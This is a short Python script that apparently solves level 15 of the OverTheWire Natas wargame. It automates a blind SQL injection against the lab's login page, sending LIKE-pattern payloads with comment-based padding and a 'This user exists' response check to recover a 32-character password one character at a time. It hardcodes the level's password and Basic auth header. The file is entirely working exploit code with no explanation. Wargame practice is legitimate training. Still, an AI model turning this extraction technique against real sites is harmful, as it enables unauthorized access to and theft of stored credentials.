import urllib.request
import re
regex = 'This user exists'
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=%22/**/or/**/username/**/like/**/%22%'
length = 32
chars = '1234567890qwertyuiopasdfghjklzxcvbnm'
fullName = ['*'] * length
name = [''] * length

for i in range(length):
    for t in range(len(chars)):
        name[i] = chars[t]
        fullName[i] = chars[t]
        print(''.join(name) + '%')
        req = urllib.request.Request(url + ''.join(name) + '%', None, {'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg'})
        o = urllib.request.urlopen(req)
        r = str(o.read(), 'utf-8')
        m = re.search(regex, r)
        if m is not None:
            print('index ' + str(t))
            print('char ' + chars[t])
            break
    print(''.join(name))
print(password)